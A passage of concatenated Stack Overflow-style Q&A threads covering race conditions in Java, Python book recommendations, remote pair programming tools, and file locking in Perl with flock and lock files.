            System.out.println(""NOT A VALID TRANSACTION"");
        }
        ;
    }

    public void deposit() {
        this.account.deposit(this.amount);
    }

    public void withdraw() {
        this.account.withdraw(amount);
    }

    public void printBalance() {
        System.out.println(Thread.currentThread().getName()
                + "" : TransactionType: "" + this.transactionType + "", Amount: ""
                + this.amount);
        System.out.println(""Account Balance: ""
                + this.account.getAccountBalance());
    }
}

class Account {
    private int accountNumber;
    private double accountBalance;

    public int getAccountNumber() {
        return accountNumber;
    }

    public double getAccountBalance() {
        return accountBalance;
    }

    public Account(int accountNumber) {
        this.accountNumber = accountNumber;
    }

    // If this method is not synchronized, you will see race condition on
    // Remove syncronized keyword to see race condition
    public synchronized boolean deposit(double amount) {
        if (amount &lt; 0) {
            return false;
        } else {
            accountBalance = accountBalance + amount;
            return true;
        }
    }

    // If this method is not synchronized, you will see race condition on
    // Remove syncronized keyword to see race condition
    public synchronized boolean withdraw(double amount) {
        if (amount &gt; accountBalance) {
            return false;
        } else {
            accountBalance = accountBalance - amount;
            return true;
        }
    }
}
</code></pre>
 <p>There is an important technical difference between race conditions and data races. Most answers seem to make the assumption that these terms are equivalent, but they are not. </p>

<p>A data race occurs when 2 instructions access the same memory location, at least one of these accesses is a write and there is no <em>happens before ordering</em> among these accesses. Now what constitutes a happens before ordering is subject to a lot of debate, but in general ulock-lock pairs on the same lock variable and wait-signal pairs on the same condition variable induce a happens-before order. </p>

<p>A race condition is a semantic error. It is a flaw that occurs in the timing or the ordering of events that leads to erroneous program <em>behavior</em>. </p>

<p>Many race conditions can be (and in fact are) caused by data races, but this is not necessary. As a matter of fact, data races and race conditions are neither the necessary, nor the sufficient condition for one another. <a href=""http://blog.regehr.org/archives/490"">This</a> blog post also explains the difference very well, with a simple bank transaction example. Here is another simple <a href=""http://stackoverflow.com/questions/11276259/are-data-races-and-race-condition-actually-the-same-thing-in-context-of-conc/18049303#18049303"">example</a> that explains the difference.</p>

<p>Now that we nailed down the terminology, let us try to answer the original question.</p>

<p>Given that race conditions are semantic bugs, there is no general way of detecting them. This is because there is no way of having an automated oracle that can distinguish correct vs. incorrect program behavior in the general case. Race detection is an undecidable problem.</p>

<p>On the other hand, data races have a precise definition that does not necessarily relate to correctness, and therefore one can detect them. There are many flavors of data race detectors (static/dynamic data race detection, lockset-based data race detection, happens-before based data race detection, hybrid data race detection). A state of the art dynamic data race detector is <a href=""https://code.google.com/p/data-race-test/wiki/ThreadSanitizer"">ThreadSanitizer</a> which works very well in practice.</p>

<p>Handling data races in general requires some programming discipline to induce happens-before edges between accesses to shared data (either during development, or once they are detected using the above mentioned tools). this can be done through locks, condition variables, semaphores, etc. However, one can also employ different programming paradigms like message passing (instead of shared memory) that avoid data races by construction.</p>
 <blockquote>
  <p>What is a Race Condition?</p>
</blockquote>

<p>You are planning to go to a movie at 5 pm. You inquire about the availability of the tickets at 4 pm. The representative says that they are available. You relax and reach the ticket window 5 minutes before the show. I'm sure you can guess what happens: it's a full house. The problem here was in the duration between the check and the action. You inquired at 4 and acted at 5. In the meantime, someone else grabbed the tickets. That's a race condition - specifically a ""check-then-act"" scenario of race conditions.</p>

<blockquote>
  <p>How do you detect them?</p>
</blockquote>

<p>Religious code review, multi-threaded unit tests. There is no shortcut. There are few Eclipse plugin emerging on this, but nothing stable yet.</p>

<blockquote>
  <p>How do you handle and prevent them?</p>
</blockquote>

<p>The best thing would be to create side-effect free and stateless functions, use immutables as much as possible. But that is not always possible. So using java.util.concurrent.atomic, concurrent data structures, proper synchronization, and actor based concurrency will help.</p>

<p>The best resource for concurrency is JCIP. You can also get some more <a href=""http://brevitaz.com/race-condition-java-concurrency-2/"">details on above explanation here</a>.</p>
 <p>You don't always want to discard a race condition. If you have a flag which can be read and written by multiple threads, and this flag is set to 'done' by one thread so that other thread stop processing when flag is set to 'done', you don't want that ""race condition"" to be eliminated. In fact, this one can be referred to as a benign race condition. </p>

<p>However, using a tool for detection of race condition, it will be spotted as a harmful race condition.</p>

<p>More details on race condition here, <a href=""http://msdn.microsoft.com/en-us/magazine/cc546569.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/magazine/cc546569.aspx</a>. </p>
 <p>Ok thats 4 questions. one by one answer is as under....</p>

<blockquote>
  <p>What is a race condition?</p>
</blockquote>

<p>It occurs when the output and/or result of the process is critically dependent on the sequence or timing of other events i.e. e.g. 2 signals are racing to change the output first.</p>

<blockquote>
  <p>How do you detect them? </p>
</blockquote>

<p>It leads to error which is difficult to localize.</p>

<blockquote>
  <p>How do you handle them? </p>
</blockquote>

<p>Use Semaphores</p>

<p>And finally,</p>

<blockquote>
  <p>How do you prevent them from occurring?</p>
</blockquote>

<p>One way to avoid race condition is using locking mechanism for resources. but locking resources can lead to deadlocks. which has to be dealt with.</p>
 <blockquote>
  <p>What is a race condition? How do you detect them? How do you prevent
  them from occurring? </p>
</blockquote>

<p>Number of answers in this thread find a comfort in categorizing the issue, i.e. in classifying race conditions into separate subclasses, like ""check-then-act"" or ""read-update-write"", or ""data race vs. race condition"" and so on.  </p>

<p>My point is that repeating the same things over and over may pacify a reader or even a writer him/herself, but it does not help the state of the art and answer the general and basic question: how to diagnose and explain a race condition automatically, i.e. without the presence of human error-prone in the process of the race condition diagnosis.  It is the human error-prone qualities what put the race conditions there in the first place.</p>

<p>Another point is that the presence of all this, often superficial,  classifications does not help the state of the art at all.  Simply see how quickly the number of the questions about race conditions is growing over time on Stack Overflow with a speed of about 1,000 new questions and answers every few month. Searching on ""race condition"" today would return you 12,364 posted questions.</p>

<p>Below you will find a solution that DOES help the state of the art.  It is completely automatic and it is not based of artificial subclassifications.</p>

<p>Java Language Specification (<a href=""http://docs.oracle.com/javase/specs/jls/se7/html/jls-17.html#jls-17.4.5"" rel=""nofollow"">JLS</a>) uses the term <strong><em>data race</em></strong>.  The formal definition of <strong><em>data race</em></strong> by the Java Language Specification (<a href=""http://docs.oracle.com/javase/specs/jls/se7/html/jls-17.html#jls-17.4.5"" rel=""nofollow"">JLS</a>) does not impose such limitations as some of the answers in this thread. </p>

<blockquote>
  <p>""What is a race condition?""</p>
</blockquote>

<p>If you study the definition of 'data race' by the JLS you will see that it exactly defines what program state is commonly understood by the term 'race condition'. “Race condition is a condition when multiple threads are accessing shared memory in undetermined order, and when at least one access is for “write” i.e. modifying the memory content”.</p>

<blockquote>
  <p>""How do you detect them?"" </p>
</blockquote>

<p>The solution for detecting all ‘data races’ or ‘race conditions’ in the context of multithreading exists and the problem is absolutely decidable by a proper dynamic analysis tool with 0% false positive result. The reasoning is explained further. The reference to one technology is offered here with the following <strong>disclaimer: the technology was build by our team at Thinking Software, Inc. and the tool is called</strong> <a href=""https://thinkingsoftware.com"" rel=""nofollow"">Race Catcher™</a></p>

<blockquote>
  <p>""How do you prevent them from occurring?""  </p>
</blockquote>

<p>Cognitive reasoning of race conditions analysis has proven to be a difficult for humans task. Using specially built libraries is also requiring not making cognitive mistakes.</p>

<p>“If debugging is the process of removing bugs, then programming must be the process of putting them in.” (Edsger W. Dijkstra)</p>

<p>We can not prevent them from occurring, but we can immediately identify them upon their very first manifestation, and prevent them from re-occurring, much like we can not prevent misspellings or syntax errors from their first manifestation.</p>

<p>Being able to identify misspellings or software syntax errors statically is defined by their static nature. They are manifested as soon as you typed them.  Race conditions have a dynamic nature and they manifest dynamically.</p>

<p>Having a proper tool that catches and automatically diagnoses them upon their very first occurence has the same effect on saving one's time and on the final result's reliability as you get from a built-in syntax checker that catches all manifested during one's writing spelling errors.</p>

<blockquote>
  <p><strong>Further reasoning and explanations:</strong></p>
</blockquote>

<p>Race conditions are one of the most challenging issues in contemporary programming and are a primary cause of unstable, intermittent, and unreliable software behavior. They can not be properly diagnosed by traditional debuggers (see further) or by log files (see further) and the cognitive, 'between the ears' approach to solve the issues were proven to provide over 30% of improper fixes, even when the presence of race conditions was noticed.</p>

<p>For the point of reference, here is list of the main points of traditional disagreements.</p>

<ol>
<li><p>Are data race and race condition, two different sets of conditions? Is one a subset of another? Are these the same conditions?</p></li>
<li><p>Is race detection an un-decidable problem? Is it even possible to find one using any tool at all?</p></li>
<li><p>Is the presence of context switching required for a race condition to occur?</p></li>
<li><p>Is it possible to “debug” a race condition using a debugger? Should one use logging to “debug” a race?</p></li>
<li><p>Can we label some race conditions as “benign”?</p></li>
<li><p>What technology is available to address detection of race conditions?</p></li>
</ol>

<blockquote>
  <p><em>Re. question-1:</em> 
  Separating ‘race condition’ and ‘data race’ is not done ‘by the book’ and it does not address the real issue of eliminating the intermittent incorrectness in results and providing a higher level of software reliability.</p>
</blockquote>

<p>The Java Language Specification (JLS) formally defines “data race ”using 'happens-before-relatioships' between actions within a process. It in turn defines 'happens-before' via order of the actions and visibility of their result by the following ordered actions.</p>

<p>The disconnect between the proponents of defining “data race” separately comes from the notion of what is ""simultaneous"" or ""concurrent"" access to a shared memory.  How simultaneous is ""simultaneous""? (The answer is obviously not there since what we are trying to define is really the uncertainty of ordering). Is it that “read – modify- write back” series of operations from two or more threads have to occur so simultaneously that before one writes back, the other one reads. Or is it sufficient to say that the 'simultaneously' means that one event can come before or after another, or on top of another in absolute time such that it would cause overlapping one thread’s “read-modify-write” events with another thread’s “read-modify-write” events or with another thread’s “read” event.</p>

<p>While defining the rules for correctly synchronized programs, JLS is using the terms “happened before” hb(x,y) – meaning ‘x’ must happen before ‘y’ and that the result of ‘x’ must be “visible” to ‘y’. The specification does not speak about that the hb(x,y) must refer to the operations of “read-modify- write back”  components of ‘write’, but speaks in general of any events that are intended to be ordered for the correct execution of the intended algorithm, no matter what reordering a particular JVM’s thread scheduler may decide to make.</p>

<blockquote>
  <p><em>Re. question-2:</em> Properly built dynamic analysis tool will immediately pinpoint and automatically diagnose 'race conditions' (or data races). As mentioned above, a 'race condition' has to manifest itself (it has to happen) to be diagnosed by such tool, however the result will be immediate and 0% false positive.</p>
  
  <p><em>Re. question-3:</em> Context switching is not required for race condition to be experienced when more than one core is involved in running the process.</p>
  
  <p><em>Re. question 4:</em> Debuggers will not help you catch a race, since debugging environment debugs the debugging environment. The thread scheduler is presented there with completely different sets of threads and locks.</p>
</blockquote>

<p>Using logging to debug a race and tracing backwards to understand the race is also simply impractical for any sufficiently complex multithreading application. Another point to make is that logging to a file will create additional synchronization, which will disappear as soon as the logging is disabled.</p>

<blockquote>
  <p><em>Re. question 5:</em> The question of ""Which race condition can be called “benign” and can be ignored?"" is best answered here: ""<a href=""http://hboehm.info/boehm-hotpar11.pdf"" rel=""nofollow"">How to miscompile programs with “benign” data races</a>"". The point is that what one may see as “benign” can easily become very harmful as a result of different compiler optimizations.</p>
</blockquote>

<p>The best approach to this question is <strong>“Just say No to “benign” races”</strong> as it is well said in the article “<a href=""https://software.intel.com/en-us/blogs/2013/01/06/benign-data-races-what-could-possibly-go-wrong"" rel=""nofollow"">Benign data races: what could possibly go wrong</a>?”</p>

<blockquote>
  <p><em>Re. question 6: What technology is available to address the issue?</em></p>
</blockquote>

<p>Static analysis tools. The shortcomings:</p>

<p>a)  Traditionally accepted shortcomings of static analysis tools are their large rate of false positive diagnosis. The false positive results come from assumptions that specific states are possible, when in fact they are not, but the reasoning behind such understanding would be too complex.</p>

<p>b)  The other shortcoming of static analysis tools is in missing actual races. That is due to the fact that static analysis tools have to address unlimited combinations of states (“State explosion” issue. See <a href=""http://babelfish.arc.nasa.gov/trac/jpf/wiki/intro/testing_vs_model_checking"" rel=""nofollow"">testing_vs_model_checking</a>)<br>
 Thus they are approaching the subject by studying subsets that they can chew on and as such are missing actual races. </p>

<p>Dynamic analysis tools: </p>

<p>(a) the traditional shortcoming is in large overhead prohibiting their use in production, however not all dynamic analysis tools are created equal. The tool that we have built after years of working on different  optimizations (see Race Catcher™ above) provides overhead that is 100s of times smaller than some other dynamic analysis tools, and is actually usable in production.</p>

<p>(b) Good dynamic code analyzer provides 0% false positive results. This is because it pinpoints and analyzes races that have been actually manifested.</p>

<p><strong>Disclaimer: the <a href=""https://thinkingsoftware.com"" rel=""nofollow"">Race Catcher™</a> technology was build by our team at Thinking Software, Inc.</strong></p>
 <p>Consider an operation which has to display the count as soon as the count gets incremented. ie., as soon as <strong>CounterThread</strong> increments the value <strong>DisplayThread</strong> needs to display the recently updated value.</p>

<pre><code>int i = 0;
</code></pre>

<p>Output  </p>

<pre><code>CounterThread -&gt; i = 1  
DisplayThread -&gt; i = 1  
CounterThread -&gt; i = 2  
CounterThread -&gt; i = 3  
CounterThread -&gt; i = 4  
DisplayThread -&gt; i = 4
</code></pre>

<p>Here <strong>CounterThread</strong> gets the lock frequently and updates the value before <strong>DisplayThread</strong> displays it. Here exists a Race condition. Race Condition can be solved by using Synchronzation</p>
"
"What is the best quick-read Python book out there? <p>I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other ""gotchas"" that come with a new programming language. Suggestions?</p>
 <p>I expect that <a href=""http://oreilly.com/catalog/9780596513986/"" rel=""nofollow"">Learning Python</a> is useful, and quick to read.</p>
 <p>I found <a href=""http://rads.stackoverflow.com/amzn/click/0596513984"" rel=""nofollow"">Learning Python</a> really good. It's pretty long (>700 pages) but <em>extremely</em> readable and you can rip through it very quickly given you're a quick study :-)</p>
 <p>I loved <a href=""http://www.diveintopython.net/toc/index.html"" rel=""nofollow"">Dive Into Python</a>, especially if you're a quick study.  The beginning basics are all covered (and may move slowly for you), but the latter few chapters are great learning tools.</p>

<p>Plus, Pilgrim is a pretty good writer.</p>
 <p>Since you're already familiar with other languages and a quick study, I'd recommend <a href=""http://books.google.com/books?id=6TEcaEzA8N0C"" rel=""nofollow"">Python in a Nutshell</a> by Alex Martelli, very concise and also useful later on for reference.</p>
 <p>Two good online-books, that also describes the basics of the environment is <a href=""http://www.diveintopython.net/toc/index.html"" rel=""nofollow"">diveintopython.net</a> and  <a href=""http://docs.python.org/tut/"" rel=""nofollow"">the ""official"" tutorial</a>.</p>
 <p><a href=""http://diveintopython.net/"" rel=""nofollow"">Dive Into Python</a> is an excellent book geared toward programmers wanting to pick up Python.  The best part is that it's freely available online.  I started learning a little Python a few months ago and I've worked through about half of the book.  It's a very comprehensive tool that's good for learning the language and also for a reference down the road.</p>

<p>Edit: Kamens is a faster typer than I am.</p>
 <p><a href=""http://rads.stackoverflow.com/amzn/click/0596513984"" rel=""nofollow"">Learning Python</a> is how I learned the language.  It's a quick read, and very well organized around fundamental concepts.  </p>
 <p><a href=""http://rads.stackoverflow.com/amzn/click/0596009402"" rel=""nofollow"">Python Pocket Reference</a>.</p>

<p>I have both Learning Python &amp; Programming Python and I almost always go to the Pocket Reference first.</p>
 <p>Many people have suggested Dive Into Python, which is probably the best Python book out there for someone who's already a good programmer.  However, if you're new to programming, the best book is probably ""How to Think Like a Computer Scientist: Learning With Python"" (<a href=""http://openbookproject.net/thinkCSpy/index.xhtml"" rel=""nofollow"">http://openbookproject.net/thinkCSpy/index.xhtml</a>)</p>
 <p>I'll second Daniel's recommendation of Python in a Nutshell. If you're quick to pick up new languages, it's probably exactly what you're looking for. There's a nice overview of how the language works, and then a discussion of most of the standard library. It's concise and clear, and doesn't assume that you don't know basic programming things already.</p>
 <p>I think that <a href=""http://www.greenteapress.com/thinkpython/"" rel=""nofollow"">Think Python</a> is very good for first-time programmers. Pleasant writing style too..</p>
 <p>I learned most of my initial pythonese from this super-handy quick reference:</p>

<p><a href=""http://rgruet.free.fr/PQR2.3.html"" rel=""nofollow"">http://rgruet.free.fr/PQR2.3.html</a></p>
 <p>I tried learning from Programming Python and I didn't like it. I'm going to give Python in a Nutshell a try as per suggestions below. </p>
 <p>I'm a big fan of <a href=""http://corepython.com/"" rel=""nofollow"">Core Python</a></p>
 <p>I quite enjoyed reading <a href=""http://www.deitel.com/Books/InternetWebScripting/PythonHowtoProgram1e/tabid/1830/Default.aspx"" rel=""nofollow"">H.Deitel - Python - How to Program</a>. It's very long but basics of Python are covered in first 300-400 pages. It's a nice book for beginners.</p>
 <p>Dive Into Python is a good choice, but I also recommend <a href=""http://rads.stackoverflow.com/amzn/click/0321585445"" rel=""nofollow"">Python Visual Quickstart Guide</a>
For someone that knows how to program and wants to get the 80% of the basics of the language, it's a good deal. And it retails at $20. It's certainly not the last thing I'd read on python, but it's a good first one.</p>
 <p>I learned more from the <a href=""http://rads.stackoverflow.com/amzn/click/0596007973"" rel=""nofollow"">python cookbook</a> than any other python book.</p>
 <p>I have to second (third? fourth?) <a href=""http://www.diveintopython.net/toc/index.html"" rel=""nofollow"">Dive Into Python</a>. It's just great for quick reference and reading. As an added suggestion, read some code! That always helps.</p>
 <p>Dive into Python for a fast jump start, Learning Python (O'Reilly) is better for the long complete journey.</p>

<p>Just my $0.02.</p>
 <p>There are quite a few good <strong>books online</strong>. These have a broad scope, similar to O'Reilly's ""Learning Python"":</p>

<ul>
<li><a href=""http://www.diveintopython.net/toc/index.html"" rel=""nofollow"">Dive into Python</a> by Mark Pilgrim</li>
<li><a href=""http://openbookproject.net/thinkCSpy/"" rel=""nofollow"">How to think like a computer scientist: Learning with Python</a> by Jeffrey Elkner, Allen B. Downey, and Chris Meyers</li>
<li><a href=""http://en.wikibooks.org/wiki/Python_Programming"" rel=""nofollow"">Python Programming</a> (WikiBook)</li>
<li><a href=""http://docs.python.org/tutorial/"" rel=""nofollow"">The Python Tutorial</a> is the ""official"" introduction to the language</li>
</ul>

<p><a href=""http://python.org/"" rel=""nofollow"">Python.org</a> maintains <strong>two lists</strong> of for learning python, depending on your level of programming expertise:</p>

<ul>
<li><a href=""http://wiki.python.org/moin/BeginnersGuide/NonProgrammers"" rel=""nofollow"">Python for Non-programmers</a></li>
<li><a href=""http://wiki.python.org/moin/BeginnersGuide/Programmers"" rel=""nofollow"">Python for Programmers</a></li>
</ul>

<p><strong>I highly recommend ""Python Essential Reference""</strong> by David Beazley. You might find this sufficient <strong>if you're an experienced programmer</strong> and want a <strong>concise and comprehensive overview</strong> of the language. If you're a novice programmer this probably won't provide enough hand-holding. While I learned Python from other books, this is—by far—the most useful python book I own. Some notes:</p>

<ul>
<li>This is a reference book not a tutorial</li>
<li>The first <strong>125 pages</strong> are a <strong>complete overview</strong> of the language. It's not a tutorial, but it covers the language from top to bottom</li>
<li>If you're an experienced programmer, this should be enough to learn the language</li>
<li>If you're a novice programmer, start with a different tutorial</li>
<li>The rest of the book is a comprehensive and extremely useful reference</li>
<li>The <a href=""http://rads.stackoverflow.com/amzn/click/0672328623"" rel=""nofollow"">3<sup>rd</sup> edition</a> covers up to python 2.4, but not beyond.</li>
<li>The <a href=""http://rads.stackoverflow.com/amzn/click/0672329786"" rel=""nofollow"">4<sup>th</sup> edition</a> is due for release in July 2009</li>
</ul>

<p><strong>Note</strong>: I originally posted the same/similar answer to:  <a href=""http://stackoverflow.com/questions/934937/concise-python-book-recommendation/935081#935081"">Concise python book recommendation</a></p>

<p>I was asked to put a copy of my answer here.</p>
 <p>This is good, it's a very easy read and the excercises can be completed with only a crayon.<br />
(I think this is what Jeff was talking about when he wanted rich media content in the IDE)</p>

<p><img src=""http://ecx.images-amazon.com/images/I/61NA2175H0L.%5FSL500%5FAA240%5F.jpg"" alt=""alt text"" /></p>
 <p>It may not be as applicable, but I just cracked open Programming in Python 3 by Mark Summerfield and so far it seems pretty good, although it is focused on Python 3, so if you're planning on learning something like Django, which hasn't made the jump to Python 3 and likely won't for some time, this book might not be the best. Additionally, even though Python 3.0 has been out for a little while now, I can almost guarantee your course is using Python 2.x. Academia has a tendency to trail behind. I had a C++ recitation professor who I swear wasn't aware that C++ has been updated since 1985.</p>
 <p>I have also been using <a href=""http://rads.stackoverflow.com/amzn/click/B001OFK2DK"" rel=""nofollow"">Programming in Python 3</a> by Mark Summerfield and find it very good. </p>
 <p>I'm currently reading <a href=""http://www.headfirstlabs.com/books/hfpython/"" rel=""nofollow"">Head First Python</a> which came out in November, 2010. I didn't read <a href=""http://www.diveintopython.net/toc/index.html"" rel=""nofollow"">Dive Into Python</a> but I read <a href=""http://diveintohtml5.net/"" rel=""nofollow"">Dive Into HTML5</a> by the same writer and It was well written.</p>
 <p>I recommended this ebook <a href=""http://www.swaroopch.com/notes/Python"" rel=""nofollow"">A Byte of Python</a></p>
"
"Can you pair program remotely? <p>We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.</p>

<p>Quite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us ""drive"" while the other consults, and then switch.</p>

<p>My question is has anyone tried this ""virtual"" pair programming, and did you find it at all useful?</p>
 <p>Trying to pair program remotely probably won't be as useful as doing it in person, but you can of course do it using collaborative editors as <a href=""http://www.codingmonkeys.de/subethaedit/"" rel=""nofollow"">SubEthaEdit</a> in OS X.</p>
 <p>We've been using the new ECF features in Eclipse 3.4 (Ganymede) and we like it. We're not actually remote from each other except when one of us is working at home but ECF lets you edit the same file and also has an IM window for chatting. If you use Skype, so much the better.</p>

<p>There's a good <a href=""http://www.vimeo.com/1195398"" rel=""nofollow"">screencast on Vimeo</a> of the screen sharing that really made us excited about it.</p>
 <p>In my current job, I've worked with another developer who was in another location. While we consulted quite often with each other through phone calls (headsets are a huge plus!) and screen sharing, the real 'together work' (including some real pair programming) was much more effective when I visited his location (did that twice for a whole week, and these weeks were <em>very</em> intense).</p>

<p>The main problem with screen sharing is that you never know who is going to move the mouse,... (for example to point at something on the screen).</p>

<p>On that project, we ended up dividing the work into 2 sub-projects, and got together (meaning: travelling) to plug them together. </p>
 <p>I know Netbeans has a plugin for ""Developer Collaboration"" (<a href=""http://collab.netbeans.org/files/documents/186/522/NB-Collab-Code-Review-for-JavaOne-v2.swf"">flash demo</a>), which is basically like multiplayer-programming.  Any changes you make in your local file are replicated almost immediately to the other party.  It's pretty cool, but it's been a while since I've played with it, and I've never used it for a real project.  There is a chat window but you're probably better off still talking on the phone or using skype.</p>
 <p>I've done quite a lot of pair-programming not only cross-site but cross-timezone.  I live in Israel and I work with people on the West Coast all the time.  The best way I've found is to use shared VNC session and skype.  You need some ""good behavior"" to ensure that only one of us types at a given time.  The VNC server that we use gives us two different pointers so we can move our respective mice without getting in the way, so long as we don't actually click.<br />
The main problem is that the clipboard is shared, so if someone selects something it's automatically copied to the other's clipboard.<br />
As a general rule, pair programming cross site, while not ideal, is certainly workable, and most definitely useful.</p>
 <p>On OSX, I've used vim and a multi-user GNU screen session - this gives much better responsiveness than VNC, screen-sharing, etc. I use this set-up along with Skype and a headset for voice communication.</p>

<p>I've done a lot of pairing remotely like this and I find it can work very well. However, for it to work well, just as with face-to-face pairing (but probably more so), I think you need both parties to be well motivated and familiar with the tools you are using. Also (more than in the face-to-face scenario) I think that it helps to give more of a running commentary on what you are doing.</p>
 <p>We've used <a href=""http://www.webex.com/"" rel=""nofollow"">webex</a> for this.  While it's not necessarily ideal for this kind of thing, it does have some features to mediate who controls the computer and when.</p>
 <p>Yes - I have done remote pairing. </p>

<p><strong>We used an old-fashioned speakerphone and VNC. We paired between Seattle and Bournemouth, England.</strong> The cross-atlantic time lag made VNC very difficult to use - it's difficult not to interrupt somebody else using the mouse with the random network lag.</p>

<p>You need a lot of patience and some conventions taking turns ""driving"" the keyboard and mouse.</p>

<p><strong>We only did remote pairing for development for short periods of time - say 30 mins or so because most people developed headaches quite quickly.</strong> It was so painful with the network lags. We just kept for problem solving and where people got to a point where it was easier to explain by demonstration than by reading text on a wiki.</p>

<p>I think these days, you might get a better result using remote desktop - which I have also used for pairing. My remote desktop remote pairing was for support and deployment though and it was between two remote developers logging into a machine at work. People tell me that remote desktop is much more efficient than VNC in terms of bandwidth - but I can't verify that.</p>
 <p>I'd just wanted to add some really nice plugin for the Eclipse IDE - its called <b>Saros</B> and it's OSS. Has some really beautiful features! <br>
It has some nice features (highlighting source, built-in VoIP (beta), chat and some more to come such as screen-sharing and whiteboard features)...<p>
Find out about it at <a href=""http://www.saros-project.org/"" rel=""nofollow"">saros-project.org</a></p>
 <p>Yes, you can absolutely pair program remotely, and I've done so successfully for extended periods of time. We had Skype audio chat open pretty much all day long, and used <a href=""http://www.teamviewer.com/"" rel=""nofollow"">TeamViewer</a> to mirror the screen. Worked splendidly. </p>

<p>If I recall correctly, it has a pen/drawing tool that allows the navigator to show the driver what he's talking about on the screen.</p>
 <p>there is a pretty good list of editors with collaborative real time features on wikipedia:
<a href=""http://en.wikipedia.org/wiki/Collaborative_real-time_editor#List_of_current_editors"" rel=""nofollow"">http://en.wikipedia.org/wiki/Collaborative_real-time_editor#List_of_current_editors</a></p>

<p>I personally tried <em>Etherpad</em> which was later acquired by Google and partially integrated into Google Wave's real time ""mail"" transmission, a featureset that now presumably survives in Google docs. Another very nice web based Solution is Mozilla's <em>Cloud code</em> formerly known as <em>Bespin</em>. Adobe also has made an entrance into this with BuzzWords, though not used for coding, hence no syntax highlighting and alike, it does work with locking sessions for only one editor to take control. I had no luck with the Eclipse COLA Framework (ECF) but the project looked promising when I last looked into it. Some people do simply use Google docs</p>

<p>Companies such as <strong>Google</strong> and <strong>Amazon</strong> also commonly use those web editors <strong>in their interview process</strong> for <strong>quick pair programming sessions</strong> on smaller problems, where the interviewee codes in a web based session and an Interviewer uses text highlighting and alike to drill into specific sessions, I have seen interviewers even simply editing the code alongside. </p>

<p>Other than some of the reports seen here, I never had cross Atlantic issues with delay and have done longer/intense coding sessions. There is a fair amount of research on the influence of jitter and delay on collaborative editing, where quite often jitter is perceived as far more disruptive and constant delay, equal across all used tools, appears as something users can adopt to:
<a href=""http://scholar.google.com/scholar?q=Jitter+and+Delay+real+time+collab"" rel=""nofollow"">http://scholar.google.com/scholar?q=Jitter+and+Delay+real+time+collab</a></p>

<p>Though sitting next to each other may avoid some of the required adaptations to a different style of communication, there are distinct advantages in using software to collaborate. Pairing over a system allows full records of an entire session, and should details worked on in a session become unclear (though that should perhaps not happen, it surely sometimes does) you can simply go through the recording of the session. Etherpad had a handy little feature that allows you to go through a time-line of all edits and slide back and fourth through the session.</p>

<p>In my opinion coding collaboratively should not be approached in the same way as pair programming, in that you should take advantage of the ability to edit concurrently. Ping pong programming becomes a lot more interactive when tests are constantly written, each dev chooses at will whether to watch the other one live or wait and understand the finished test instead. It allows for small detours writing the same approach in an A/B programming fashion without having to wait for both to sequentially be implemented and discussed, instead both can be written alongside.</p>

<p>best regards
Granit</p>
"
"How do I lock a file in Perl? <p>What is the best way to create a lock on a file in Perl?</p>

<p>Is it best to flock on the file or to create a lock file to place a lock on and check for a lock on the lock file?</p>
 <p>Use the <a href=""http://perldoc.perl.org/functions/flock.html"" rel=""nofollow"">flock</a> Luke. </p>

<p><strong>Edit:</strong> <a href=""http://www.perlmonks.org/?node_id=7058"" rel=""nofollow"">This</a> is a good explanation.</p>
 <p>flock creates Unix-style file locks, and is available on most OS's Perl runs on.  However flock's locks are advisory only.</p>

<p>edit: emphasized that flock is portable</p>
 <p>If you end up using flock, here's some code to do it:</p>

<pre><code>use Fcntl ':flock'; # Import LOCK_* constants

# We will use this file path in error messages and function calls.
# Don't type it out more than once in your code.  Use a variable.
my $file = '/path/to/some/file';

# Open the file for appending.  Note the file path is quoted
# in the error message.  This helps debug situations where you
# have a stray space at the start or end of the path.
open(my $fh, '&gt;&gt;', $file) or die ""Could not open '$file' - $!"";

# Get exclusive lock (will block until it does)
flock($fh, LOCK_EX) or die ""Could not lock '$file' - $!"";

# Do something with the file here...

# Do NOT use flock() to unlock the file if you wrote to the
# file in the ""do something"" section above.  This could create
# a race condition.  The close() call below will unlock the
# file for you, but only after writing any buffered data.

# In a world of buffered i/o, some or all of your data may not 
# be written until close() completes.  Always, always, ALWAYS 
# check the return value of close() if you wrote to the file!
close($fh) or die ""Could not write '$file' - $!"";
</code></pre>

<p>Some useful links:</p>

<ul>
<li><a href=""http://www.perlmonks.org/?node_id=7058"">PerlMonks file locking tutorial</a> (somewhat old)</li>
<li><a href=""http://perldoc.perl.org/functions/flock.html""><code>flock()</code> documentation</a></li>
</ul>

<p>In response to your added question, I'd say either place the lock on the file or create a file that you call 'lock' whenever the file is locked and delete it when it is no longer locked (and then make sure your programs obey those semantics).</p>
 <p>CPAN to the rescue: <a href=""http://search.cpan.org/~rani/IO-LockedFile-0.23/LockedFile.pm"">IO::LockedFile</a>. </p>
 <p>My goal in this question was to lock a file being used as a data store for several scripts. In the end I used similar code to the following (from Chris):</p>

<pre><code>open (FILE, '&gt;&gt;', test.dat') ; # open the file 
flock FILE, 2; # try to lock the file 
# do something with the file here 
close(FILE); # close the file
</code></pre>

<p>In his example I removed the flock FILE, 8 as the close(FILE) performs this action as well. The real problem was when the script starts it has to hold the current counter, and when it ends it has to update the counter. This is where Perl has a problem, to read the file you:</p>

<pre><code> open (FILE, '&lt;', test.dat');
 flock FILE, 2;
</code></pre>

<p>Now I want to write out the results and since i want to overwrite the file I need to reopen and truncate which results in the following:</p>

<pre><code> open (FILE, '&gt;', test.dat'); #single arrow truncates double appends
 flock FILE, 2;
</code></pre>

<p>In this case the file is actually unlocked for a short period of time while the file is reopened. This demonstrates the case for the external lock file. If you are going to be changing contexts of the file, use a lock file. The modified code:</p>

<pre><code>open (LOCK_FILE, '&lt;', test.dat.lock') or die ""Could not obtain lock"";
flock LOCK_FILE, 2;
open (FILE, '&lt;', test.dat') or die ""Could not open file"";
# read file
# ...
open (FILE, '&gt;', test.dat') or die ""Could not reopen file"";
#write file
close (FILE);
close (LOCK_FILE);
</code></pre>
